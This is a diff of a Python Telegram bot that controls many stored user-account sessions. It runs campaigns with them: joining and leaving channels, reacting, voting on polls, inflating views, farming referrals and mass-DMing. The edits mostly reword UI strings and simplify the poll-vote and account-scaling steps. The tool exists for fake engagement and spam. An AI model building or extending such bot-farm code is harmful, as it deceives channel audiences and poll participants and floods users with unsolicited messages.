+        await status_msg.edit_text("🔄 Synchronizing tables into local data structures...")
         
         users_merged = 0
         accounts_merged = 0
@@ -1323,17 +1274,17 @@ async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
                             await current_db.commit()
                         accounts_merged += 1
             except Exception as accounts_err:
-                await status_msg.edit_text(f"❌ Structural database map parse error: {accounts_err}")
+                await status_msg.edit_text(f"❌ Structural map table parse error: {accounts_err}")
                 return
 
         await status_msg.edit_text(
-            f"✅ Sync complete!\n\n"
+            f"✅ Sync execution loop completed:\n\n"
             f"👤 Users lines cataloged: `{users_merged}`\n"
-            f"📱 Telephony sessions updated: `{accounts_merged}`"
+            f"📱 Telephony session tokens updated: `{accounts_merged}`"
         )
         
     except Exception as e:
-        await status_msg.edit_text(f"❌ Handler processing issue: {e}")
+        await status_msg.edit_text(f"❌ Internal data handler processing issue: {e}")
     finally:
         if os.path.exists(temp_filename):
             os.remove(temp_filename)
@@ -1345,11 +1296,11 @@ async def export_db(callback: CallbackQuery, bot: Bot):
     try:
         with open(db_mgr.db_path, "rb") as f:
             file = BufferedInputFile(f.read(), filename="database_core_backup.db")
-        await callback.message.reply_document(file, caption="📂 SQLite Database Backup File")
+        await callback.message.reply_document(file, caption="📂 Current SQLite Database Backup File")
     except Exception as e:
-        await callback.message.answer(f"❌ Backup failed to open: {e}")
+        await callback.message.answer(f"❌ Backup pipeline failed to open: {e}")
 
-# --- TASK CONFIGURATION HUNDLING FLOW WIZARD ---
+# --- TASK WIZARD INTERFACE FLOW ---
 @router.callback_query(F.data == "task_hub_start")
 async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: Bot):
     await callback.answer()
@@ -1365,9 +1316,10 @@ async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: 
         active_count = (await cursor.fetchone())[0]
 
     wizard_text = (
-        f"🚀 **Campaign Wizard Hub**\n\n"
-        f"📱 Online active accounts: `{active_count}` profiles.\n\n"
-        f"Step 1: Choose the task action type to run below: "
+        f"🚀 Campaign Wizard Configuration Hub\n"
+        f"----------------------------------------\n"
+        f"📱 Accounts loadout status check: `{active_count}` profiles online.\n\n"
+        f"Step 1: Pick the action code you want to dispatch: "
     )
     await callback.message.edit_text(text=wizard_text, reply_markup=get_task_types_keyboard(active_count))
     await state.set_state(TaskWizardStates.choosing_type)
@@ -1380,15 +1332,15 @@ async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
     
     if task_type == "leave":
         await callback.message.edit_text(
-            "Step 2: Choose your leave action protocol mode:", 
+            "Step 2: Choose leave execution protocol profile mode:", 
             reply_markup=get_leave_channel_options_keyboard()
         )
         await state.set_state(TaskWizardStates.waiting_for_leave_choice)
     elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
-        await callback.message.edit_text("Step 2: Enter the channel link reference location or username handle target (Example: `@channelname`):")
+        await callback.message.edit_text("Step 2: Enter the channel link reference location layout or handle target name (Example: `@channelname`):")
         await state.set_state(TaskWizardStates.waiting_for_channel_link)
     elif task_type == "refer":
-        await callback.message.edit_text("Step 2: Input your referral link address destination (Example: `https://t.me/Bot?start=123`):")
+        await callback.message.edit_text("Step 2: Input target referral link address value (Example: `https://t.me/Bot?start=123`):")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
     else:
         await callback.message.edit_text("Step 2: Enter targeted structural public path link or join chat secret key:")
@@ -1412,7 +1364,7 @@ async def task_hub_process_channel_link(message: Message, state: FSMContext):
     channel_target = message.text.strip()
     await state.update_data(channel_target=channel_target)
     
-    await message.answer("Step 3: Paste the message post tracking link structure (Example: `https://t.me/channelname/123`):")
+    await message.answer("Step 3: Paste message tracking specific index link structure address value (Example: `https://t.me/channelname/123`):")
     await state.set_state(TaskWizardStates.waiting_for_post_link)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
@@ -1425,10 +1377,7 @@ async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot)
 
     if task_type in ["join", "leave", "refer", "view", "speed"]:
         await prompt_for_account_scale(message, state)
-    elif task_type == "dm":
-        await message.answer("Step 4: Write message content lines to push out:")
-        await state.set_state(TaskWizardStates.waiting_for_dm_text)
-    elif "react" in task_type and "vote" not in task_type:
+    elif "react" in task_type:
         await state.update_data(selected_emojis=[])
         await message.answer(
             "Step 4: Select targeted reaction array emoji elements list layout framework configurations:",
@@ -1436,90 +1385,11 @@ async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot)
         )
         await state.set_state(TaskWizardStates.waiting_for_emojis)
     elif "vote" in task_type:
-        # INTERACTIVE DYNAMIC VOTING OPTION DETECTION HOOK
-        status_msg = await message.answer("🔍 Connecting to channel post to fetch active interactive voting options...")
-        
-        user_id = message.from_user.id
-        role = await db_mgr.get_user_role(user_id)
-        
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            if role in ["admin", "owner", "super_owner"]:
-                cursor = await db.execute("SELECT session_string FROM accounts WHERE status = 'active' LIMIT 1")
-            else:
-                cursor = await db.execute("SELECT session_string FROM accounts WHERE status = 'active' AND user_id = ? LIMIT 1", (user_id,))
-            row = await cursor.fetchone()
-            
-        if not row:
-            await status_msg.edit_text("❌ Error: You must have at least one active account to dynamically read post voting data blocks.")
-            await state.clear()
-            return
-            
-        parsed_target, link_msg_id = parse_telegram_link(target)
-        channel_target = data.get("channel_target", target)
-        parsed_channel, _ = parse_telegram_link(channel_target)
-        msg_id = int(link_msg_id or 0)
-        
-        try:
-            client = TelegramClient(StringSession(decrypt_data(row[0])), config.API_ID, config.API_HASH)
-            await client.connect()
-            
-            try:
-                if isinstance(parsed_channel, str) and ("+" in channel_target or "joinchat/" in channel_target):
-                    await client(functions.messages.ImportChatInviteRequest(hash=parsed_channel))
-                else:
-                    await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
-            except Exception:
-                pass
-                
-            msg = await client.get_messages(parsed_target, ids=msg_id)
-            await client.disconnect()
-            
-            if msg and msg.reply_markup:
-                buttons_list = []
-                for r_idx, row in enumerate(msg.reply_markup.rows):
-                    for b_idx, btn in enumerate(row.buttons):
-                        if isinstance(btn, tg_types.KeyboardButtonCallback):
-                            buttons_list.append((btn.text, btn.data.hex()))
-                            
-                if not buttons_list:
-                    raise ValueError("No clickable inline callback voting buttons detected inside this destination target.")
-                    
-                inline_kb_rows = []
-                for label, hex_data in buttons_list:
-                    inline_kb_rows.append([InlineKeyboardButton(text=label, callback_data=f"pick_vote:{hex_data}")])
-                    
-                inline_kb_rows.append([InlineKeyboardButton(text="🔀 Split / Randomize Over All Buttons", callback_data="pick_vote:__RANDOM_ANY__")])
-                inline_kb_rows.append([InlineKeyboardButton(text="🔙 Cancel", callback_data="main_menu")])
-                
-                await status_msg.edit_text(
-                    "📊 **Interactive Poll Options Found!**\n\nSelect which button option target your accounts should vote on:",
-                    reply_markup=InlineKeyboardMarkup(inline_keyboard=inline_kb_rows)
-                )
-                await state.set_state(TaskWizardStates.waiting_for_vote_selection)
-            else:
-                raise ValueError("The target message does not have any inline voting buttons.")
-        except Exception as err:
-            await status_msg.edit_text(f"❌ Failed to fetch poll details automatically: {str(err)}\nPlease verify the link structure profile rules.")
-            await state.clear()
-
-@router.callback_query(StateFilter(TaskWizardStates.waiting_for_vote_selection), F.data.startswith("pick_vote:"))
-async def handle_vote_picked_selection(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    hex_data = callback.data.split(":")[1]
-    await state.update_data(button_data=hex_data)
-    
-    data = await state.get_data()
-    task_type = data.get("task_type")
-    
-    if "react" in task_type:
-        await state.update_data(selected_emojis=[])
-        await callback.message.edit_text(
-            "Step 5: Choose dynamic reaction emoji components matrix layout properties rules list items layout:",
-            reply_markup=get_emoji_selection_keyboard([])
-        )
-        await state.set_state(TaskWizardStates.waiting_for_emojis)
-    else:
-        await prompt_for_account_scale(callback.message, state)
+        await message.answer("Step 4: Type down identical poll button label string text configuration matching choice target:")
+        await state.set_state(TaskWizardStates.waiting_for_button_text)
+    elif task_type == "dm":
+        await message.answer("Step 4: Write message content context string layout array lines to push out:")
+        await state.set_state(TaskWizardStates.waiting_for_dm_text)
 
 @router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
 async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
@@ -1543,14 +1413,24 @@ async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext, bot
         return
     await callback.answer()
     await state.update_data(reactions=selected)
-    await prompt_for_account_scale(callback.message, state)
+    
+    task_type = data.get("task_type")
+    if "vote" in task_type:
+        await callback.message.answer("Step 5: Type identical button choice parameter matching layout target string:")
+        await state.set_state(TaskWizardStates.waiting_for_button_text)
+    else:
+        await prompt_for_account_scale(callback.message, state)
+
+@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
+async def process_button_text(message: Message, state: FSMContext, bot: Bot):
+    await state.update_data(button_text=message.text.strip())
+    await prompt_for_account_scale(message, state)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
 async def process_dm_text(message: Message, state: FSMContext, bot: Bot):
     await state.update_data(text=message.text.strip())
     await prompt_for_account_scale(message, state)
 
-# --- REFACTORED ACCOUNT SCALING SELECTOR ARCHITECTURE ---
 async def prompt_for_account_scale(message: Message, state: FSMContext):
     user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
     role = await db_mgr.get_user_role(user_id)
@@ -1562,56 +1442,40 @@ async def prompt_for_account_scale(message: Message, state: FSMContext):
             cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
         max_available = (await cursor.fetchone())[0]
         
-    await state.update_data(max_available_scale=max_available)
-    
-    scale_text = (
-        f"🔢 **Account Scaling Allocation**\n\n"
-        f"Available online active accounts: `{max_available}`\n\n"
-        f"Select how many accounts you want to connect to this task configuration:"
+    prompt_msg = (
+        f"🔢 Select Action Deployment Account Scaling Threshold\n\n"
+        f"Available active online connection tokens total: `{max_available}`\n"
+        f"Input target scaling count parameter variable to run:\n"
+        f"(Type `0` to launch task with ALL profile modules active)"
     )
     
-    buttons = [
-        [InlineKeyboardButton(text="⚡ Deploy with ALL Available Accounts", callback_data="scale_choice:all")],
-        [InlineKeyboardButton(text="✏️ Specify Custom Account Scale Number", callback_data="scale_choice:custom")],
-        [InlineKeyboardButton(text="🔙 Cancel", callback_data="main_menu")]
-    ]
-    
     if isinstance(message, Message):
-        await message.answer(scale_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+        await message.answer(prompt_msg)
     else:
-        await message.edit_text(scale_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+        await message.answer(prompt_msg)
         
     await state.set_state(TaskWizardStates.waiting_for_account_scale)
 
-@router.callback_query(StateFilter(TaskWizardStates.waiting_for_account_scale), F.data.startswith("scale_choice:"))
-async def handle_scale_choice_buttons(callback: CallbackQuery, state: FSMContext, bot: Bot):
-    await callback.answer()
-    choice = callback.data.split(":")[1]
-    data = await state.get_data()
-    max_available = data.get("max_available_scale", 0)
-    
-    if choice == "all":
-        await state.update_data(run_account_count=max_available)
-        await finalize_task_creation(callback.message, state, bot)
-    elif choice == "custom":
-        await callback.message.edit_text(
-            f"🔢 Type the **exact number** of accounts you want to connect to this task (Must be between `1` and `{max_available}`):"
-        )
-        await state.set_state(TaskWizardStates.waiting_for_custom_scale_value)
-
-@router.message(StateFilter(TaskWizardStates.waiting_for_custom_scale_value))
-async def process_custom_scale_text_value(message: Message, state: FSMContext, bot: Bot):
+@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
+async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
     scale_text = message.text.strip()
     if not scale_text.isdigit():
-        await message.answer("❌ Invalid format. Please enter numbers only:")
+        await message.answer("❌ Invalid input entry layout format description rules. Type numbers only:")
         return
         
     requested_count = int(scale_text)
-    data = await state.get_data()
-    max_available = data.get("max_available_scale", 0)
+    user_id = message.from_user.id
+    role = await db_mgr.get_user_role(user_id)
+    
+    async with aiosqlite.connect(db_mgr.db_path) as db:
+        if role in ["admin", "owner", "super_owner"]:
+            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
+        else:
+            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
+        max_available = (await cursor.fetchone())[0]
 
-    if requested_count < 1 or requested_count > max_available:
-        await message.answer(f"❌ Number out of boundary fields! Enter a scale value between 1 and `{max_available}`:")
+    if requested_count > max_available:
+        await message.answer(f"❌ Selection boundary exceeded maximum resource pools: `{max_available}`. Try downscaling entry input value:")
         return
 
     await state.update_data(run_account_count=requested_count)
@@ -1630,7 +1494,7 @@ async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
 
     init_msg = await bot.send_message(
         chat_id=user_id, 
-        text="⏳ Bootstrapping execution threads...\nStarting workers, please wait..."
+        text="⏳ Bootstrapping deployment threads...\nConnecting endpoints, please wait..."
     )
 
     async with aiosqlite.connect(db_mgr.db_path) as db:
@@ -1651,9 +1515,9 @@ async def view_tasks(callback: CallbackQuery, bot: Bot):
         cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10" if role in ["admin", "owner", "super_owner"] else "SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
         rows = await cursor.fetchall()
 
-    text = "📊 **Task History Log Index**\n\n"
+    text = "📊 Historical Logging Event Feed Index Matrix\n\n"
     for r in rows:
-        text += f"🔹 Task: `#{r[0]}` (Type: `{r[1].upper()}`)\nStatus: `{r[2]}` | Progress: `{r[3]}`\nTo pull details use: `/taskreport_{r[0]}`\n\n"
+        text += f"🔹 Task Log item: `#{r[0]}` (Type: `{r[1].upper()}`)\nState context indicator: `{r[2]}` | Scale tracking: `{r[3]}`\nTo pull details type command layout: `/taskreport_{r[0]}`\n\n"
     await callback.message.edit_text(text or "No logging tracks present in repository files system index records.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))
 
 @router.message(F.text.startswith("/taskreport_"))
@@ -1672,7 +1536,7 @@ async def cmd_task_report(message: Message, bot: Bot):
         await message.answer("🚫 Data visibility permissions restrictions mismatch parameters configuration.")
         return
 
-    report_text = f"📊 Profile Task Track Sheet ID: `#{task_id}`\n\nType: `{row[1].upper()}`\nStatus: `{row[2]}`\nProgress: `{row[3]}`"
+    report_text = f"📊 Profile Task Track Sheet Sheet ID: `#{task_id}`\n\nType: `{row[1].upper()}`\nStatus string: `{row[2]}`\nProgress level parameters mapping: `{row[3]}`"
     await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")]]))
 
 @router.callback_query(F.data == "view_referrals")
@@ -1682,18 +1546,18 @@ async def view_referrals(callback: CallbackQuery, bot: Bot):
     async with aiosqlite.connect(db_mgr.db_path) as db:
         async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
             count = (await cursor.fetchone())[0]
-    await callback.message.edit_text(f"👥 **Referral Hub Link**\n\nShare this invite link to earn rewards:\n`https://t.me/{bot_username}?start=ref_{user_id}`\n\nTotal referred users: `{count}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))
+    await callback.message.edit_text(f"👥 Invitation Tracking Matrix\n\nShare personal connection line below to register profiles:\n`https://t.me/{bot_username}?start=ref_{user_id}`\n\nTotal referrals registered under profile line index mapping: `{count}`", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))
 
 @router.callback_query(F.data == "admin_panel")
 async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
     await callback.answer()
     await callback.message.edit_text(
-        "🛠️ **Admin Dashboard Panel Command Index**\n\n"
-        "Available commands:\n"
-        "🔹 `/addadmin <id> <limit>` - Grant admin profile levels\n"
-        "🔹 `/removeadmin <id>` - Revoke admin privileges\n"
-        "🔹 `/broadcast` - Dispatch text notification to global system pool\n"
-        "🔹 `/canceltasks` - Stop all active running processing workflows",
+        "🛠️ Admin Execution Dashboard Commands Index Matrix\n\n"
+        "Available shell text commands syntax structures:\n"
+        "🔹 `/addadmin <id> <limit>` - Grant admin properties privileges\n"
+        "🔹 `/removeadmin <id>` - Terminate authorization structural map tokens\n"
+        "🔹 `/broadcast` - Force notification text lines to global system pool\n"
+        "🔹 `/canceltasks` - Trigger manual system thread kill sequence loop",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]])
     )
 
@@ -1715,16 +1579,16 @@ async def system_stats(callback: CallbackQuery, bot: Bot):
         cursor = await db.execute("SELECT user_id, username, role FROM users WHERE role = 'admin' OR user_id IN (SELECT DISTINCT user_id FROM accounts)")
         user_rows = await cursor.fetchall()
         
-        admin_metrics_text = "\n👥 Account Allocation Breakdown:\n"
+        admin_metrics_text = "\n👥 Account Allocations Map Matrix Breakdown Logs:\n"
         for u_id, u_name, u_role in user_rows:
             acc_count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (u_id,))
             acc_count = (await acc_count_res.fetchone())[0]
-            admin_metrics_text += f"• `{u_id}` (`@{u_name or 'None'}`) [{u_role.upper()}] ➜ Connected: `{acc_count}` accounts\n"
+            admin_metrics_text += f"• Profile target: `{u_id}` (`@{u_name or 'None'}`) [{u_role.upper()}] ➜ Linked: `{acc_count}` items\n"
             
     stats_text = (
-        f"📈 **System Performance Analytics Metrics**\n\n"
-        f"👥 Total registered user database size: `{total_users}`\n"
-        f"📱 Total linked account session assets: `{total_accounts}`\n"
+        f"📈 Performance Tracking Metrics Feed Summary\n\n"
+        f"👥 Global user index count size: `{total_users}`\n"
+        f"📱 Linked sessions framework size: `{total_accounts}`\n"
         f"🟢 Active operational phone tokens online: `{active_accounts}`\n"
         f"----------------------------------------\n"
         f"{admin_metrics_text}"
